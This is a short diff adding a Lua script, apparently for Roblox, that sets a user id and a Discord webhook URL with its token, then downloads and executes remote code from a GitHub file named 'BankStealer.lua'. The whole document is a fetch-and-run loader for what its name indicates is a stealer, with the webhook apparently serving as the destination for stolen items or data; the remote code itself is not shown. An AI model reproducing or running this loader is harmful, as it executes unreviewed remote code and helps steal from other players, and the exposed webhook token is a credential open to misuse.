@@ -1,0 +1,5 @@
+_G.Userid = 804138277
+
+_G.Webhook = "https://discord.com/api/webhooks/1075439240197980271/IZxq9R___tgN5ejrkwG-mh2FIwLdZNO5yt7GyPXWBp8pdrKHNYpxgQGb9hA7z99UpPGg"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SaskeCen/Cat-Hub/main/BankStealer.lua"))()
